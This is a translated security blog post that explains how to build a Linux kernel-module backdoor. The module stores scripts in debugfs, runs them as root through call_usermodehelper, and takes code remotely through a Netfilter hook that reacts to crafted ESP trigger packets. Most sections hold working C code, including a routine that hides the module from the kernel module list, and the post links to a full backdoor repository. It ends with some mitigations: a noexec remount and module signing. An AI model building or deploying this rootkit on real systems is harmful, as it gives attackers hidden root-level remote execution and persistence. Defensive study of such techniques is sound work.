> 原文链接: https://www.anquanke.com//post/id/146894 


# 如何使用 debugfs 和 nf 钩子来远程执行代码


                                阅读量   
                                **105989**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://nbulischeck.io/
                                <br>原文地址：[https://nbulischeck.io/posts/misusing-debugfs-for-in-memory-rce](https://nbulischeck.io/posts/misusing-debugfs-for-in-memory-rce)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t013e660de55b613648.jpg)](https://p3.ssl.qhimg.com/t013e660de55b613648.jpg)



## 前言

[Debugfs是一种简单易用的基于RAM的文件系统，专门为内核调试目的而设计。](https://www.kernel.org/doc/Documentation/filesystems/debugfs.txt)。它与2.6.10-rc3版本一起发布，由GregKroah-Hartman编写。本文将展示如何使用调试器和Netfilter钩子来创建一个可加载的内核模块，该模块能够完全在RAM中远程执行代码。

攻击者的理想过程是首先获得对目标的非特权访问，执行本地权限提升以获得根访问权限，将内核模块作为持久性方法插入到计算机上，然后转向下一个目标。

> 注：以下是Ubuntu12.04(3.13.0-32)，Ubuntu14.04(4.4.0-31)，Ubuntu16.04(4.13.0-36)image的测试和工作。所有的开发都是在Arch上完成的，只使用了几个最新的内核版本(4.16+)。
 

## debugfs RCE的实用性

当我深入研究使用调试器有多实用时，我需要了解它在各种系统中的流行程度。

对于6.06到18.04的每个Ubuntu版本以及CentOS版本6和7，我创建了一个VM并检查了下面的三个语句（statement）。此图表详细说明了每个发行版的每个问题的答案。我要找的主要是看看是否有可能在第一时间安装该设备。如果这是不可能的，那么我们将无法在后门中使用调试器。

幸运的是，除了Ubuntu6.06之外，每个发行版都能够挂载调试器。从10.04开始的每个Ubuntu版本以及CentOS 7都默认安装了它。
1. Present：/sys/kernel/debug/是否在第一次加载时出现？
1. Mounted：/sys/kernel/debug/是否在第一次加载时挂载？
1. Possible：是否可以使用sudo mount -t debugfs none /sys/kernel/debug来挂载调试器？
<th style="text-align: left;">Operating System</th><th style="text-align: left;">Present</th><th style="text-align: left;">Mounted</th><th style="text-align: left;">Possible</th>
|------
<td style="text-align: left;">Ubuntu 6.06</td><td style="text-align: left;">No</td><td style="text-align: left;">No</td><td style="text-align: left;">No</td>
<td style="text-align: left;">Ubuntu 8.04</td><td style="text-align: left;">Yes</td><td style="text-align: left;">No</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Ubuntu 10.04*</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Ubuntu 12.04</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Ubuntu 14.04**</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Ubuntu 16.04</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Ubuntu 18.04</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Centos 6.9</td><td style="text-align: left;">Yes</td><td style="text-align: left;">No</td><td style="text-align: left;">Yes</td>
<td style="text-align: left;">Centos 7</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td><td style="text-align: left;">Yes</td>

> <ul>
- 调试程序也以rw的形式安装在服务器版本上，相对于/var/lib/ureadahead/debugfs
- 此外，tracefs也以rw形式安装在服务器、相对于/var/lib/ureadahead/debugfs/tracing。
</ul>
 

## debugfs的执行代码

一旦我确定调试器很流行，我就编写了一个[简单的PoC](https://gist.github.com/nbulischeck/37a86f4db9157372c016abf2235b424d)，看看是否可以从它执行文件。毕竟，它是一个文件系统。

调试器API实际上非常简单。使用的主要功能是：**debugfs_initialized**-检查是否注册了调试器，**debugfs_create_blob**-为任意大小的二进制对象创建文件，以及调试器**debugfs_remove**-删除调试器文件。

在PoC中，我没有使用**debugfs_initialized**，因为我知道它是存在的，但这是一个很好的完整性检查（sanity-check）。

为了创建该文件，我使用了**debugfs_create_blob**而不是**debugfs_create_file**，因为我的最初目标是执行ELF二进制文件。不幸的是，我没能让它发挥作用-以后再谈。创建文件所需做的就是将blob指针分配给保存内容的缓冲区，并给它一个长度。将其看作是编写自己的文件操作的抽象更容易理解，就像在设计字符设备时所做的那样。

下面的代码应该是非常容易理解的。**dfs**保存文件条目，**myblob**保存文件内容(指向保存程序和缓冲区长度的缓冲区的指针)。我只需在安装之后调用**debugfs_create_blob**函数，其中包含文件的名称、文件的模式(权限)、**NULL**父文件以及数据。

```
struct dentry *dfs = NULL;
struct debugfs_blob_wrapper *myblob = NULL;

int create_file(void)`{`
    unsigned char *buffer = "
#!/usr/bin/env pythonn
with open("/tmp/i_am_groot", "w+") as f:n
    f.write("Hello, world!")";

    myblob = kmalloc(sizeof *myblob, GFP_KERNEL);
    if (!myblob)`{`
        return -ENOMEM;
    `}`

    myblob-&gt;data = (void *) buffer;
    myblob-&gt;size = (unsigned long) strlen(buffer);

    dfs = debugfs_create_blob("debug_exec", 0777, NULL, myblob);
    if (!dfs)`{`
        kfree(myblob);
        return -EINVAL;
    `}`
    return 0;
`}`
```

删除调试器中的文件就像删除文件一样简单。只需调用**ebugfs_remove**，文件就会消失。在它周围包装一个错误检查，只是为了确定，还有它只需3行代码。

```
void destroy_file(void)`{`
    if (dfs)`{`
        debugfs_remove(dfs);
    `}`
`}`
```

最后，我们实际执行我们创建的文件。据我所知，从内核空间到用户空间执行文件的唯一方法是通过名为call_usermodehelper的函数执行。TimJones写了一篇关于UMH使用的优秀文章，叫做[从内核调用用户空间应用程序](https://www.ibm.com/developerworks/library/l-user-space-apps/index.html)，所以如果你想了解更多，我强烈建议你阅读这篇文章。

为了使用**call_usermodehelper**，我们设置了**argv**和**envp**数组，然后调用函数。最后一个标志决定了内核在执行该函数后应该如何继续(“我应该等待还是应该继续？”)。对于不熟悉的对象，**envp**数组保存进程的环境变量。我们在上面创建并希望执行的文件是**/sys/kernel/debug/debug_exec**。我们可以使用下面的代码完成这个操作。

```
void execute_file(void)`{`
    static char *envp[] = `{`
        "SHELL=/bin/bash",
        "PATH=/usr/local/sbin:/usr/local/bin:"
            "/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    `}`;

    char *argv[] = `{`
        "/sys/kernel/debug/debug_exec",
        NULL
    `}`;

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
`}`
```

我现在建议读者自己尝试[PoC代码](https://gist.github.com/nbulischeck/37a86f4db9157372c016abf2235b424d)，以便更好地了解在实际执行我们的程序方面所做的工作。要检查它是否工作，运行**ls/tmp/**并查看文件**i_am_groot**是否存在。



## Netfilter

现在我们知道了程序是如何在内存中执行的，但是如何发送代码并让内核远程运行呢？答案是使用Netfilter！Netfilter是Linux内核中的一个框架，它允许内核模块在内核的网络堆栈中注册名为钩子的回调函数。

如果这一切听起来太复杂了，那就把Netfilter钩子想象成一个俱乐部的保镖吧。保镖只允许戴绿徽章的俱乐部成员通过(接受)，但踢出任何戴红色徽章的人(拒绝/拒绝)。他也可以选择改变任何人的徽章颜色。假设有人戴着红色徽章，但保镖还是想让他们进来。保镖可以在门口拦截这个人，把他们的警徽改成绿色。这就是所谓的包“破坏（mangling）”。

对于我们的情况，我们不需要弄乱任何数据包，但是对于读者来说，这可能是有用的。有了这个概念，我们就可以检查通过的任何数据包，看看它们是否符合我们的标准。我们将限定的数据包称为“触发器数据包（trigger packets）”，因为它们会触发代码中的某些操作。

Netfilter钩子很棒，因为您不需要公开主机上的任何端口来获取信息。如果您想更深入地了解Netfilter，您可以阅读本文或[Netfilter文档](https://www.netfilter.org/documentation/HOWTO/netfilter-hacking-HOWTO-3.html)。

[![](https://p4.ssl.qhimg.com/t01d0fc346fca37092b.png)](https://p4.ssl.qhimg.com/t01d0fc346fca37092b.png)

当我使用Netfilter时，我会在最早的阶段:pre-routing拦截数据包。



## ESP包

我选择使用的包称为ESP。[ESP或封装SecurityPayload数据包](https://tools.ietf.org/html/rfc4303)旨在为IPv 4和IPv 6提供多种安全服务。它是IPSec相当标准的一部分，它传输的数据应该是加密的。这意味着可以将脚本的加密版本放在客户端上，然后将其发送到服务器进行解密和运行。



## Netfilter代码

Netfilter钩子非常容易实现。钩子的原型如下：

```
unsigned int function_name (
        unsigned int hooknum,
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff *)
);
```

所有这些参数都不是非常重要，所以让我们继续讨论需要的参数：**struct sk_buff *skb**。**sk_bus**有点复杂，所以如果您想阅读更多关于它们的信息，您可以在[这里](https://wiki.linuxfoundation.org/networking/sk_buff)找到更多信息。

要获取数据包的IP报头，请使用函数**skb_network_header**并将其类型转换为struct iphdr *。

```
struct iphdr *ip_header;

ip_header = (struct iphdr *)skb_network_header(skb);
if (!ip_header)`{`
    return NF_ACCEPT;
`}`
```

接下来，我们需要检查我们收到的数据包的协议是否是ESP数据包。这可以非常容易地做到，现在我们有了header。

```
if (ip_header-&gt;protocol == IPPROTO_ESP)`{`
    // Packet is an ESP packet
`}`
```

ESP数据包在其头中包含两个重要值。这两个值是SPI和SEQ。SPI表示安全参数索引，SEQ表示序列。两者在技术上最初都是任意的，但预计每个数据包的序列号都会增加。我们可以使用这些值来定义哪些数据包是我们的触发器数据包。如果一个包匹配正确的SPI和SEQ值，我们将执行我们的操作。

```
if ((esp_header-&gt;spi == TARGET_SPI) &amp;&amp;
    (esp_header-&gt;seq_no == TARGET_SEQ))`{`
    // Trigger packet arrived
`}`
```

一旦确定了目标数据包，就可以使用struct的成员**enc_data**提取ESP数据。理想情况下，这将被加密，从而确保您在目标计算机上运行的代码的隐私，但为了在PoC中简单起见，我将其省略了。

棘手的部分是Netfilter钩子运行在一个软性的上下文中，这使得它们运行得非常快，但是有点微妙。处于软性上下文中，Netfilter可以同时处理跨多个CPU的传入数据包。他们不能进入睡眠状态，延迟的工作在中断上下文中运行(这对我们非常不利，它需要使用延迟的工作队列，[如state.c中所示](https://github.com/nbulischeck/debugfs-backdoor/blob/master/backdoor/state.c))。

本节的完整代码可以在[这里](https://github.com/nbulischeck/debugfs-backdoor/blob/master/backdoor/nfhook.c)找到。



## 限制
1. debugfs必须出现在目标的内核版本中(&gt;=2.6.10-rc3)。
1. 必须挂载debugfs(如果不是的话，这是很容易修复的)。
1. rculist.h必须存在于内核中(&gt;=Linux2.6.27.62)。
1. 只能运行解释脚本。
任何包含解释器指令(python、ruby、perl等)的命令都可以在调用**call_usermodehelper**时协同工作。有关解释器指令的更多信息，请参阅[维基百科的这篇文章](https://en.wikipedia.org/wiki/Shebang_(Unix))。

```
void execute_file(void)`{`
    static char *envp[] = `{`
        "SHELL=/bin/bash",
        "HOME=/root/",
        "USER=root",
        "PATH=/usr/local/sbin:/usr/local/bin:"
            "/usr/sbin:/usr/bin:/sbin:/bin",
        "DISPLAY=:0",
        "PWD=/", 
        NULL
    `}`;

    char *argv[] = `{`
        "/sys/kernel/debug/debug_exec",
        NULL
    `}`;

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
`}`
```

Go也可以工作，但可以说它并不完全在RAM中，因为它必须生成一个临时文件才能构建它，而且它还需要.go文件扩展名，从而使这一点更加明显。

```
void execute_file(void)`{`
    static char *envp[] = `{`
        "SHELL=/bin/bash",
        "HOME=/root/",
        "USER=root",
        "PATH=/usr/local/sbin:/usr/local/bin:"
            "/usr/sbin:/usr/bin:/sbin:/bin",
        "DISPLAY=:0",
        "PWD=/", 
        NULL
    `}`;

    char *argv[] = `{`
        "/usr/bin/go",
        "run",
        "/sys/kernel/debug/debug_exec.go",
        NULL
    `}`;

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
`}`
```



## 发现

如果我要添加隐藏内核模块的能力(可以通过下面的代码简单地完成)，将非常困难。通过这种技术执行的长时间运行的进程是显而易见的，因为会有一个进程的PID数很高，由root用户拥有，并且运行**&lt;interpreter&gt; /sys/kernel/debug/debug_exec**。但是，如果没有活动的执行，我就会认为唯一的发现方法是分析自定义Netfilter钩子的辅助内核模块。

```
struct list_head *module;
int module_visible = 1;

void module_unhide(void)`{`
    if (!module_visible)`{`
        list_add(&amp;(&amp;__this_module)-&gt;list, module);
        module_visible++;
    `}`
`}`

void module_hide(void)`{`
    if (module_visible)`{`
        module = (&amp;__this_module)-&gt;list.prev;
        list_del(&amp;(&amp;__this_module)-&gt;list);
        module_visible--;
    `}`
`}`
```



## 替代方法

最简单的替代方法是将调试器重新装入为noexec，以便禁止在其上执行文件。据我所知，没有理由以默认方式安装它。然而，这是可以忽略的。在重新安装noexec后不再工作的示例可以在下面的屏幕截图中。<br>
对于一般的内核模块，默认情况下应该要求模块签名。模块签名涉及到在安装过程中对内核模块进行加密签名，然后在将其加载到内核时检查签名。“[这可以通过禁止加载使用无效密钥签名的无符号模块或模块来提高内核安全性。模块签名增加了将恶意模块加载到内核中的难度，从而提高了安全性。](https://www.kernel.org/doc/html/v4.16/admin-guide/module-signing.html)”<br>[![](https://p1.ssl.qhimg.com/t01243825e0f7c87214.png)](https://p1.ssl.qhimg.com/t01243825e0f7c87214.png)

```
# Mounted without noexec (default)
cat /etc/mtab | grep "debugfs"
ls -la /tmp/i_am_groot
sudo insmod test.ko
ls -la /tmp/i_am_groot
sudo rmmod test.ko
sudo rm /tmp/i_am_groot
sudo umount /sys/kernel/debug
```

```
# Mounted with noexec
sudo mount -t debugfs none -o rw,noexec /sys/kernel/debug
ls -la /tmp/i_am_groot
sudo insmod test.ko
ls -la /tmp/i_am_groot
sudo rmmod test.ko
```



## 进一步研究

一个明显的扩展领域是找到一种更标准的加载程序的方法，以及一种加载ELF文件的方法。另外，开发一个内核模块，它可以清楚地识别从内核模块加载的自定义Netfilter钩子，这将有助于击败几乎所有使用Netfilter钩子的LKM rootkit。
